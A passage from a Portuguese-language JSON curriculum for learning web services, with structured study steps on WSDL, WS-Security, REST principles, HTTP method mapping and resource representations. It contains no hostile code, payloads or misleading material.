                                  "materials": [
                                    "Editor XML como VS Code",
                                    "Exemplo WSDL com tipos complexos"
                                  ],
                                  "tips": "Use ferramentas como XMLSpy para validar schemas em <types>.",
                                  "learningObjective": "Interpretar definições de dados no WSDL para entender payloads de SOAP.",
                                  "commonMistakes": [
                                    "Misturar <types> com <message>",
                                    "Esquecer namespaces em schemas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar Operações e PortTypes",
                                  "subSteps": [
                                    "Analise <portType> como coleção de operações abstratas (request-response, one-way).",
                                    "Liste operações dentro de <portType> e seus inputs/outputs referenciados a mensagens.",
                                    "Explique como portType define a interface sem detalhes de protocolo.",
                                    "Diferencie portType (abstrato) de binding (concreto).",
                                    "Crie uma lista de operações de um portType exemplo."
                                  ],
                                  "verification": "Liste todas as operações de um portType e descreva seus parâmetros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "WSDL sample com múltiplas operações",
                                    "Ferramenta SoapUI para visualizar portTypes"
                                  ],
                                  "tips": "Lembre-se: portType é como uma classe abstrata em programação orientada a objetos.",
                                  "learningObjective": "Mapear operações do serviço via portType no WSDL.",
                                  "commonMistakes": [
                                    "Confundir operação com método implementado",
                                    "Ignorar estilos como RPC vs Document"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender Portas, Bindings e o Contrato Completo",
                                  "subSteps": [
                                    "Examine <binding> para mapear portType a protocolo SOAP (SOAP 1.1/1.2, HTTP).",
                                    "Analise <port> como endpoint concreto com URL e binding associado.",
                                    "Revise <service> que agrupa múltiplas ports.",
                                    "Sintetize como todos os elementos formam o contrato: o que o serviço oferece e como acessar.",
                                    "Gere um cliente mock baseado no WSDL usando uma ferramenta."
                                  ],
                                  "verification": "Descreva o endpoint completo de um service e gere um esqueleto de chamada SOAP.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "SoapUI ou Postman para testar WSDL",
                                    "Exemplo WSDL completo"
                                  ],
                                  "tips": "Use wsdl2java ou similar para gerar código e validar compreensão.",
                                  "learningObjective": "Reconhecer portas como pontos de acesso concretos no contrato WSDL.",
                                  "commonMistakes": [
                                    "Confundir binding com portType",
                                    "Esquecer URL no <port>"
                                  ]
                                }
                              ],
                              "practicalExample": "Considere um WSDL para um serviço 'Calculadora': <types> define 'addRequest' com operandos int; <message> para addRequest/addResponse; <portType> com operação 'add'; <binding> SOAP over HTTP; <port> em http://example.com/calc. Um cliente lê isso para enviar SOAP <add> com dois ints e receber soma.",
                              "finalVerifications": [
                                "Pode explicar WSDL como contrato em 2 minutos?",
                                "Identifica corretamente types, messages, portType em um WSDL dado?",
                                "Lista portas e operações de um service?",
                                "Descreve como WSDL permite geração automática de clientes?",
                                "Diferencia elementos abstratos de concretos?",
                                "Gera um diagrama do contrato de um WSDL simples?"
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição do papel do WSDL como contrato SOAP.",
                                "Compreensão detalhada de types, messages e schemas.",
                                "Correta interpretação de operações em portType.",
                                "Identificação precisa de bindings, ports e services.",
                                "Capacidade de ligar todos elementos em uma visão coesa do contrato.",
                                "Uso de exemplos concretos na explicação."
                              ],
                              "crossCurricularConnections": [
                                "XML e Schemas: Fundamentos de estrutura de dados em WSDL.",
                                "Programação Web: Integração com HTTP e SOAP em desenvolvimento full-stack.",
                                "Arquitetura de Software: Conceitos de interfaces e contratos em SOA.",
                                "Banco de Dados: Mapeamento de tipos complexos para entidades relacionais.",
                                "Segurança da Informação: WS-Security em bindings SOAP."
                              ],
                              "realWorldApplication": "Em sistemas empresariais como bancos (ex: serviços de transferência via SOAP), WSDL define contratos para integrações seguras entre apps legados e modernos, permitindo que ferramentas gerem clientes automaticamente para transações financeiras confiáveis."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.3.1.2.3",
                            "name": "Identificar extensões de segurança em SOAP",
                            "description": "Discutir WS-Security para autenticação, criptografia e assinatura digital em trocas SOAP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos do WS-Security",
                                  "subSteps": [
                                    "Leia a especificação oficial do WS-Security no site do OASIS.",
                                    "Identifique os componentes principais: Security Header, Tokens de Segurança e Binding.",
                                    "Analise a estrutura básica de uma mensagem SOAP com cabeçalho de segurança.",
                                    "Compare WS-Security com segurança em HTTP básica.",
                                    "Anote definições chave: autenticação, integridade e confidencialidade."
                                  ],
                                  "verification": "Resuma em 3 frases os papéis do WS-Security em SOAP.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Especificação WS-Security 1.1 (OASIS)",
                                    "Documentação W3C SOAP",
                                    "SoapUI para visualização"
                                  ],
                                  "tips": "Use diagramas para mapear o cabeçalho wsse:Security.",
                                  "learningObjective": "Entender o escopo e estrutura do WS-Security como extensão SOAP.",
                                  "commonMistakes": "Confundir WS-Security com SSL/TLS; WS-Security é para nível de mensagem."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Mecanismos de Autenticação",
                                  "subSteps": [
                                    "Estude UsernameToken para autenticação básica (usuário/senha).",
                                    "Aprenda sobre X.509 Tokens para certificados digitais.",
                                    "Configure um exemplo de UsernameToken em uma mensagem SOAP.",
                                    "Teste autenticação com ferramentas como Postman ou SoapUI.",
                                    "Discuta SAML e Kerberos como tokens avançados."
                                  ],
                                  "verification": "Crie uma mensagem SOAP de exemplo com UsernameToken válida.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Exemplos de código WS-Security no GitHub",
                                    "SoapUI ou Apache CXF",
                                    "Documentação UsernameToken Profile"
                                  ],
                                  "tips": "Sempre codifique senhas em digest para evitar transmissão em claro.",
                                  "learningObjective": "Identificar e implementar tokens de autenticação em WS-Security.",
                                  "commonMistakes": "Usar senhas em texto plano sem digest ou nonce."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar Criptografia em Mensagens SOAP",
                                  "subSteps": [
                                    "Revise XML Encryption standards (W3C).",
                                    "Aprenda a criptografar elementos SOAP específicos (Body, Header).",
                                    "Gere chaves simétricas e assimétricas para exemplos.",
                                    "Aplique EncryptedKey e ReferenceList em uma mensagem.",
                                    "Valide descriptografia com ferramentas de depuração."
                                  ],
                                  "verification": "Criptografe e descriptografe uma mensagem SOAP de teste.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Biblioteca XML Security (Java/Python)",
                                    "Exemplos W3C XML Encryption",
                                    "OpenSSL para chaves"
                                  ],
                                  "tips": "Criptografe apenas dados sensíveis para otimizar performance.",
                                  "learningObjective": "Aplicar criptografia para confidencialidade em trocas SOAP.",
                                  "commonMistakes": "Criptografar o cabeçalho de segurança inteiro, bloqueando processamento."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Assinatura Digital para Integridade",
                                  "subSteps": [
                                    "Estude XML Digital Signature (W3C).",
                                    "Crie assinaturas usando DSA/RSA sobre partes da mensagem.",
                                    "Inclua SignedInfo, SignatureValue e KeyInfo.",
                                    "Valide assinaturas em mensagens SOAP compostas.",
                                    "Teste cenários de tamper detection."
                                  ],
                                  "verification": "Assine uma mensagem SOAP e verifique a integridade após alteração.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramentas como xmlsec1",
                                    "Documentação XML Signature",
                                    "Certificados de teste (self-signed)"
                                  ],
                                  "tips": "Use Canonicalization para lidar com variações de whitespace.",
                                  "learningObjective": "Garantir integridade e não-repúdio via assinaturas em SOAP.",
                                  "commonMistakes": "Esquecer Canonicalization, causando falhas de validação."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Identificar e Integrar Extensões em Arquiteturas SOAP",
                                  "subSteps": [
                                    "Analise mensagens SOAP reais com todas as extensões (auth, encrypt, sign).",
                                    "Monte um fluxo completo: cliente-servidor com WS-Security.",
                                    "Identifique headers wsse em Wireshark ou logs.",
                                    "Discuta políticas WS-Policy para enforcement.",
                                    "Crie um checklist para auditoria de segurança SOAP."
                                  ],
                                  "verification": "Audite uma mensagem SOAP identificando todas as extensões de segurança.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Wireshark para captura de tráfego",
                                    "Exemplos completos Apache Axis2",
                                    "WS-Policy docs"
                                  ],
                                  "tips": "Combine múltiplas proteções em camadas para segurança robusta.",
                                  "learningObjective": "Reconhecer e validar extensões WS-Security em cenários reais.",
                                  "commonMistakes": "Ignorar ordem de processamento: auth antes de encrypt/sign."
                                }
                              ],
                              "practicalExample": "Em um serviço bancário SOAP, uma requisição de transferência usa WS-Security: UsernameToken para autenticação do cliente, XML Encryption no <transferAmount> para confidencialidade, e XML Signature no <accountId> para integridade, garantindo que apenas clientes autorizados modifiquem dados seguros.",
                              "finalVerifications": [
                                "Explique WS-Security em 200 palavras.",
                                "Identifique componentes em uma mensagem SOAP fornecida.",
                                "Crie e valide uma mensagem com autenticação + criptografia.",
                                "Detecte falhas em uma mensagem malformada.",
                                "Discuta trade-offs de performance vs. segurança.",
                                "Audite um exemplo real de produção."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de headers wsse:Security (90%+).",
                                "Correta distinção entre autenticação, criptografia e assinatura.",
                                "Exemplos práticos funcionais e testados.",
                                "Compreensão de standards W3C/OASIS.",
                                "Análise de riscos e mitigações.",
                                "Clareza na explicação de integrações."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia (matemática computacional: chaves RSA/DSA).",
                                "Redes (protocolos de segurança em camadas OSI).",
                                "Desenvolvimento de Software (integração em frameworks como Spring WS).",
                                "Gestão de TI (políticas de segurança e compliance GDPR)."
                              ],
                              "realWorldApplication": "Em sistemas empresariais como ERP SAP ou serviços financeiros (ex: SWIFT), WS-Security protege trocas SOAP entre bancos, prevenindo fraudes via autenticação forte, criptografia de dados sensíveis e assinaturas para auditoria legal."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.1.3",
                        "name": "Arquitetura REST",
                        "description": "Estilo arquitetural baseado em recursos HTTP, priorizando simplicidade, escalabilidade e uso de verbos HTTP para operações CRUD em serviços web.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.3.1",
                            "name": "Listar princípios REST",
                            "description": "Enumerar e exemplificar os seis princípios REST: client-server, stateless, cacheable, layered system, code on demand e uniform interface.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e memorizar os seis princípios REST",
                                  "subSteps": [
                                    "Pesquise a definição de REST como estilo arquitetural proposto por Roy Fielding.",
                                    "Leia uma visão geral dos princípios fundamentais em uma fonte confiável como a tese original ou documentação oficial.",
                                    "Crie uma lista numerada dos seis princípios: 1. Client-Server, 2. Stateless, 3. Cacheable, 4. Layered System, 5. Code on Demand, 6. Uniform Interface.",
                                    "Use um mnemônico como 'CS-CL-CO-UN' para memorizar a ordem.",
                                    "Repita a lista em voz alta ou escreva 5 vezes para fixação."
                                  ],
                                  "verification": "Escreva a lista dos 6 princípios sem consultar materiais e confira com uma referência.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Papel e caneta ou editor de texto",
                                    "Artigo de Roy Fielding sobre REST"
                                  ],
                                  "tips": [
                                    "Associe cada princípio a uma imagem mental: Client-Server como garçom e cozinha separadas."
                                  ],
                                  "learningObjective": "Enumerar com precisão os seis princípios REST na ordem correta.",
                                  "commonMistakes": [
                                    "Confundir REST com SOAP (que não é stateless), esquecer 'Code on Demand' por ser opcional."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender as definições de Client-Server, Stateless e Cacheable",
                                  "subSteps": [
                                    "Estude Client-Server: Separação de responsabilidades onde client foca em UI e server em dados.",
                                    "Analise Stateless: Cada request contém toda informação necessária, sem estado no server.",
                                    "Explore Cacheable: Responses podem ser armazenadas em cache para eficiência.",
                                    "Anote uma definição de uma frase para cada um.",
                                    "Compare com exemplos não-REST para contrastar."
                                  ],
                                  "verification": "Explique cada um em uma frase curta e valide com uma fonte externa.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação REST oficial",
                                    "Vídeo tutorial curto sobre REST (5-10 min)",
                                    "Notebook"
                                  ],
                                  "tips": [
                                    "Pense em Stateless como 'cada pedido é independente, como comprar em uma loja sem cartão de fidelidade'."
                                  ],
                                  "learningObjective": "Definir com clareza os três primeiros princípios e suas implicações.",
                                  "commonMistakes": [
                                    "Achar que stateless significa sem cookies/sessões; cookies são client-side no REST."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar Layered System, Code on Demand e Uniform Interface",
                                  "subSteps": [
                                    "Defina Layered System: Arquitetura permite intermediários transparentes como proxies.",
                                    "Entenda Code on Demand (opcional): Server envia código executável para client (ex: JavaScript).",
                                    "Detalhe Uniform Interface: Uso de identificadores únicos, manipulação via representações, HATEOAS, etc.",
                                    "Crie um diagrama simples mostrando como eles funcionam juntos.",
                                    "Resuma as vantagens de cada um."
                                  ],
                                  "verification": "Desenhe um fluxograma simples ilustrando um request passando por layers e verifique componentes uniformes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de desenho como Draw.io ou papel",
                                    "Referências sobre HATEOAS",
                                    "Exemplos de APIs REST"
                                  ],
                                  "tips": [
                                    "Uniform Interface é o coração: padroniza tudo com HTTP methods e URIs."
                                  ],
                                  "learningObjective": "Explicar os três últimos princípios com exemplos de componentes arquiteturais.",
                                  "commonMistakes": [
                                    "Ignorar que Code on Demand é opcional e raro hoje, confundir com server-side rendering."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Exemplificar e integrar todos os princípios",
                                  "subSteps": [
                                    "Para cada princípio, encontre um exemplo em uma API real como GitHub ou JSONPlaceholder.",
                                    "Simule um request HTTP stateless e cacheável usando Postman ou curl.",
                                    "Discuta como uniform interface usa GET/POST/PUT/DELETE.",
                                    "Identifique violações comuns em APIs ruins.",
                                    "Crie um quiz pessoal respondendo perguntas sobre cada princípio."
                                  ],
                                  "verification": "Registre exemplos concretos para os 6 princípios em um documento e teste com um colega ou autoavaliação.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Postman ou curl",
                                    "API pública como https://jsonplaceholder.typicode.com",
                                    "Documentação da API"
                                  ],
                                  "tips": [
                                    "Teste cache headers em responses reais para ver cacheable em ação."
                                  ],
                                  "learningObjective": "Aplicar os princípios a cenários reais de APIs web.",
                                  "commonMistakes": [
                                    "Exemplos genéricos sem código HTTP real; não testar statelessness."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva uma API REST simples para gerenciar uma lista de tarefas: Client (app React) envia requests stateless via HTTP (uniform interface) para server Node.js, responses com ETag para cache, proxies (layered), e scripts JS on-demand para extensões client-side.",
                              "finalVerifications": [
                                "Listar os 6 princípios REST corretamente sem hesitação.",
                                "Explicar cada princípio com uma frase precisa.",
                                "Identificar se uma API dada viola um princípio específico.",
                                "Simular um request HTTP demonstrando stateless e cacheable.",
                                "Desenhar um diagrama de layered system para uma API real.",
                                "Discutir uniform interface usando HATEOAS em um exemplo."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na enumeração dos princípios (100% corretos).",
                                "Clareza e correção nas definições (sem jargões errados).",
                                "Relevância e concretude dos exemplos práticos.",
                                "Demonstração de compreensão integrada (como princípios interagem).",
                                "Capacidade de identificar violações em cenários reais.",
                                "Uso correto de terminologia HTTP/REST."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos HTTP e camadas OSI.",
                                "Banco de Dados: Gerenciamento de sessões stateless com tokens JWT.",
                                "Segurança da Informação: Autenticação em uniform interface (OAuth).",
                                "Desenvolvimento Ágil: APIs REST em microsserviços escaláveis.",
                                "Engenharia de Software: Princípios de separação de concerns (Client-Server)."
                              ],
                              "realWorldApplication": "APIs REST powers serviços como Twitter, Spotify e Google Maps, permitindo apps mobile/web acessarem dados de forma escalável, cache-efficiente e independente de estado, facilitando manutenção global e integração em ecossistemas distribuídos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.3.1.3.2",
                            "name": "Mapear métodos HTTP a operações REST",
                            "description": "Associar GET (leitura), POST (criação), PUT (atualização), DELETE (exclusão) a recursos URI, com exemplos de endpoints.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os métodos HTTP principais",
                                  "subSteps": [
                                    "Estude a definição e propósito de GET, POST, PUT e DELETE.",
                                    "Analise as características idempotentes de cada método (GET, PUT, DELETE são idempotentes; POST não).",
                                    "Revise cabeçalhos comuns como Content-Type e Authorization.",
                                    "Leia a especificação RFC 7231 para métodos HTTP.",
                                    "Anote diferenças entre métodos seguros (GET, HEAD) e não seguros (POST, PUT, DELETE)."
                                  ],
                                  "verification": "Liste corretamente as características de cada método em um documento ou quiz autoavaliado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação RFC 7231",
                                    "Site MDN Web Docs - HTTP Methods",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use diagramas visuais para diferenciar métodos seguros de idempotentes.",
                                  "learningObjective": "Identificar e descrever as propriedades fundamentais dos métodos HTTP GET, POST, PUT e DELETE.",
                                  "commonMistakes": [
                                    "Confundir idempotência com segurança",
                                    "Achar que POST é sempre para criação",
                                    "Ignorar impactos de cache no GET"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender o mapeamento CRUD em REST",
                                  "subSteps": [
                                    "Defina as operações CRUD: Create (criar), Read (ler), Update (atualizar), Delete (excluir).",
                                    "Associe conceitualmente: GET=Read, POST=Create, PUT=Update, DELETE=Delete.",
                                    "Discuta variações como PATCH para atualizações parciais (não obrigatório aqui).",
                                    "Estude princípios REST: stateless, recursos URI representados por substantivos.",
                                    "Crie uma tabela de mapeamento manual entre HTTP e CRUD."
                                  ],
                                  "verification": "Crie uma tabela completa mapeando métodos HTTP a operações CRUD sem erros.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Guia RESTful APIs",
                                    "Ferramenta de desenho como Draw.io",
                                    "Exemplos de APIs públicas como JSONPlaceholder"
                                  ],
                                  "tips": "Lembre-se: REST usa substantivos para URIs (ex: /users), não verbos.",
                                  "learningObjective": "Mapear operações CRUD padrão às suas contrapartes HTTP em contextos REST.",
                                  "commonMistakes": [
                                    "Usar verbos em URIs como /getUsers",
                                    "Confundir PUT (substituição completa) com POST",
                                    "Ignorar o papel de URIs em identificar recursos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir exemplos de endpoints REST",
                                  "subSteps": [
                                    "Escolha um recurso exemplo, como 'usuários' (/users).",
                                    "Gere endpoints: GET /users (lista), GET /users/{id} (ler um), POST /users (criar), PUT /users/{id} (atualizar), DELETE /users/{id} (excluir).",
                                    "Inclua payloads JSON exemplo para POST e PUT.",
                                    "Teste endpoints em uma ferramenta como Postman ou Insomnia.",
                                    "Documente códigos de status esperados: 200 OK, 201 Created, 404 Not Found, etc."
                                  ],
                                  "verification": "Implemente e teste 5 endpoints em uma API mock, registrando respostas corretas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Postman ou Insomnia",
                                    "JSONPlaceholder API (fake.rest)",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Sempre use HTTPS em produção; teste com dados reais simulados.",
                                  "learningObjective": "Criar e validar endpoints URI que mapeiem corretamente métodos HTTP a operações em um recurso específico.",
                                  "commonMistakes": [
                                    "Esquecer parâmetros de caminho como {id}",
                                    "Usar GET para mutações de dados",
                                    "Retornar códigos de status incorretos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar e validar mapeamentos em cenários reais",
                                  "subSteps": [
                                    "Analise uma API real como GitHub API ou Stripe.",
                                    "Mapeie 10 endpoints para suas operações CRUD.",
                                    "Identifique padrões como coleções (/users) vs. instâncias (/users/1).",
                                    "Simule erros comuns, como DELETE idempotente.",
                                    "Crie um diagrama de fluxo para um ciclo completo CRUD em um app de blog."
                                  ],
                                  "verification": "Desenvolva um relatório com mapeamentos corretos de uma API real e diagrama validado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação GitHub API",
                                    "Swagger/OpenAPI explorer",
                                    "Ferramenta de diagramas como Lucidchart"
                                  ],
                                  "tips": "Verifique idempotência: repetir PUT/DELETE não deve alterar o resultado.",
                                  "learningObjective": "Aplicar mapeamentos HTTP-REST em APIs existentes e cenários complexos.",
                                  "commonMistakes": [
                                    "Mapear incorretamente coleções vs. recursos únicos",
                                    "Omitir status codes apropriados",
                                    "Confundir POST para bulk operations"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de gerenciamento de biblioteca: GET /books (listar livros), GET /books/123 (detalhes do livro 123), POST /books (adicionar novo livro com JSON {title: 'REST Guide', author: 'Expert'}), PUT /books/123 (atualizar completamente o livro 123), DELETE /books/123 (remover livro 123). Teste no Postman para ver respostas 200/201/204.",
                              "finalVerifications": [
                                "Explica corretamente idempotência de GET, PUT, DELETE.",
                                "Constrói endpoints válidos para um recurso sem verbos em URI.",
                                "Associa GET=Read, POST=Create, PUT=Update, DELETE=Delete sem hesitação.",
                                "Identifica códigos de status corretos para cada operação.",
                                "Diferencia PUT (full replace) de PATCH (opcional, partial update).",
                                "Testa endpoints em ferramenta real com payloads JSON válidos."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento 1:1 HTTP-CRUD (100% correto).",
                                "Uso correto de URIs com substantivos e parâmetros de caminho.",
                                "Inclusão de payloads, headers e status codes apropriados.",
                                "Demonstração de idempotência via testes repetidos.",
                                "Aplicação em pelo menos 2 recursos diferentes (ex: users, books).",
                                "Ausência de anti-padrões REST como verbos em URIs."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Mapeamento direto de queries SQL (SELECT=GET, INSERT=POST).",
                                "Segurança da Informação: Autenticação via headers em métodos mutáveis.",
                                "Desenvolvimento Frontend: Integração com fetch/axios para chamadas API.",
                                "Redes de Computadores: Entendimento de protocolos HTTP/HTTPS subjacentes.",
                                "Design de Software: Princípios SOLID aplicados a APIs stateless."
                              ],
                              "realWorldApplication": "Desenvolvimento de APIs para e-commerce (GET /products, POST /orders), apps mobile (PUT /user/profile), microsserviços em cloud (DELETE /sessions para logout), integrando com serviços como AWS API Gateway ou backend Node.js/Express."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.3.3",
                            "name": "Descrever representações de recursos em REST",
                            "description": "Explicar o uso de formatos como JSON e XML para serialização de recursos, incluindo HATEOAS para hipermedia.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de representações de recursos em REST",
                                  "subSteps": [
                                    "Ler a definição oficial de recursos e representações no guia REST de Roy Fielding.",
                                    "Identificar a diferença entre o recurso (abstração) e sua representação (serialização concreta).",
                                    "Analisar exemplos simples de representações em respostas HTTP.",
                                    "Estudar os princípios de uniformidade e statelessness relacionados às representações.",
                                    "Mapear como URIs identificam recursos e representações os descrevem."
                                  ],
                                  "verification": "Escrever um parágrafo explicando a distinção entre recurso e representação, com um exemplo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Guia REST de Roy Fielding (dissertação original)",
                                    "Documentação MDN Web Docs sobre REST",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias como 'recurso é o objeto físico, representação é a foto dele'.",
                                  "learningObjective": "Definir e diferenciar recursos de suas representações em REST.",
                                  "commonMistakes": [
                                    "Confundir representação com o recurso em si",
                                    "Ignorar o contexto HTTP na serialização"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar formatos de serialização: JSON e XML",
                                  "subSteps": [
                                    "Comparar estruturas de JSON e XML com exemplos de um recurso 'Usuário'.",
                                    "Praticar conversão de um objeto JavaScript para JSON e validar com ferramentas online.",
                                    "Criar um documento XML equivalente e validar com schema básico.",
                                    "Analisar prós e contras: legibilidade, tamanho, suporte a browsers.",
                                    "Testar serialização/deserialização usando Postman ou curl."
                                  ],
                                  "verification": "Gerar representações JSON e XML para o mesmo recurso e compará-las em um relatório curto.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "JSONLint e XML Validator online",
                                    "Postman ou Insomnia",
                                    "Exemplos de APIs públicas como JSONPlaceholder"
                                  ],
                                  "tips": "Sempre valide o formato para evitar erros de parsing.",
                                  "learningObjective": "Serializar recursos em JSON e XML, explicando escolhas de formato.",
                                  "commonMistakes": [
                                    "Usar JSON inválido (aspas duplas obrigatórias)",
                                    "Esquecer namespaces em XML complexo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar HATEOAS e hipermedia como engine of application state",
                                  "subSteps": [
                                    "Estudar o princípio HATEOAS na dissertação de Fielding.",
                                    "Analisar exemplos de links em representações (rel, href, method).",
                                    "Criar uma representação JSON com links para ações relacionadas (self, edit, delete).",
                                    "Comparar com HAL ou JSON:API standards para hipermedia.",
                                    "Simular navegação client-side seguindo links HATEOAS."
                                  ],
                                  "verification": "Montar uma representação com pelo menos 3 links HATEOAS e descrever fluxos possíveis.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação HAL (Hypertext Application Language)",
                                    "Exemplos de GitHub API",
                                    "Editor de JSON como VS Code"
                                  ],
                                  "tips": "Pense em links como 'botões invisíveis' que guiam o cliente.",
                                  "learningObjective": "Incorporar hipermedia em representações para tornar APIs auto-descritivas.",
                                  "commonMistakes": [
                                    "Links sem 'rel' descritivo",
                                    "Ignorar métodos HTTP nos links"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar descrição integrada de representações completas",
                                  "subSteps": [
                                    "Escolher um domínio (ex: e-commerce) e definir recursos com representações.",
                                    "Combinar JSON/XML com HATEOAS em um exemplo full.",
                                    "Documentar Content-Type e negociações de mídia.",
                                    "Revisar e refatorar para idempotência e cacheabilidade.",
                                    "Testar com ferramenta de API para validar a descrição."
                                  ],
                                  "verification": "Produzir um diagrama ou JSON schema descrevendo 2 representações completas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Swagger/OpenAPI para documentação",
                                    "curl ou Postman Collection",
                                    "Exemplos de Stripe API"
                                  ],
                                  "tips": "Use versionamento em representações para evoluções seguras.",
                                  "learningObjective": "Descrever representações REST completas, incluindo serialização e hipermedia.",
                                  "commonMistakes": [
                                    "Omitir status codes em links",
                                    "Representações não idempotentes"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um recurso 'Pedido' em uma API de e-commerce: {'id': 123, 'status': 'pago', 'total': 99.99, '_links': {'self': {'href': '/pedidos/123'}, 'itens': {'href': '/pedidos/123/itens', 'method': 'GET'}, 'cancelar': {'href': '/pedidos/123/cancelar', 'method': 'POST'}}}. Explique como JSON serializa isso e HATEOAS permite navegação sem hardcode de URLs.",
                              "finalVerifications": [
                                "Explicar JSON vs XML em termos de serialização REST.",
                                "Montar uma representação com HATEOAS válida.",
                                "Identificar Content-Type apropriado para respostas.",
                                "Descrever fluxo de hipermedia para um caso de uso.",
                                "Validar uma representação com ferramenta externa.",
                                "Comparar representações em diferentes formatos."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (definições corretas de termos REST).",
                                "Completude das representações (inclui serialização e hipermedia).",
                                "Uso correto de formatos JSON/XML sem erros de sintaxe.",
                                "Criatividade e relevância nos exemplos práticos.",
                                "Clareza na explicação de HATEOAS e navegação.",
                                "Integração de princípios REST como uniformidade."
                              ],
                              "crossCurricularConnections": [
                                "Banco de dados: Mapeamento de entidades para representações serializadas.",
                                "Desenvolvimento Front-end: Consumo de hipermedia em React/Vue.",
                                "Segurança da Informação: Controle de acesso em links HATEOAS.",
                                "Qualidade de Software: Versionamento de representações de API."
                              ],
                              "realWorldApplication": "APIs como GitHub e Twitter usam representações JSON com HATEOAS para permitir que clientes descubram ações dinamicamente, facilitando integrações escaláveis sem quebrar compatibilidade em atualizações."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.3.1.1.2"
                            ]
                          },
                          {
                            "id": "10.1.3.1.3.4",
                            "name": "Comparar REST e SOAP",
                            "description": "Analisar vantagens de REST (leveza, escalabilidade) versus SOAP (segurança, contratos formais) em cenários de serviços web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de REST e SOAP",
                                  "subSteps": [
                                    "Pesquise a definição e origem do REST (Representational State Transfer) como arquitetura baseada em HTTP.",
                                    "Estude os princípios RESTful: stateless, cacheable, client-server, uniform interface.",
                                    "Pesquise SOAP (Simple Object Access Protocol) como protocolo baseado em XML com envelope estruturado.",
                                    "Identifique as camadas de SOAP: envelope, header, body e fault.",
                                    "Compare superficialmente os formatos de mensagem: JSON/XML em REST vs XML estrito em SOAP."
                                  ],
                                  "verification": "Crie um diagrama comparativo simples dos fundamentos de cada um e explique em 3 frases cada.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial REST (Roy Fielding thesis)",
                                    "W3C SOAP specification",
                                    "Ferramentas de diagramação como Draw.io"
                                  ],
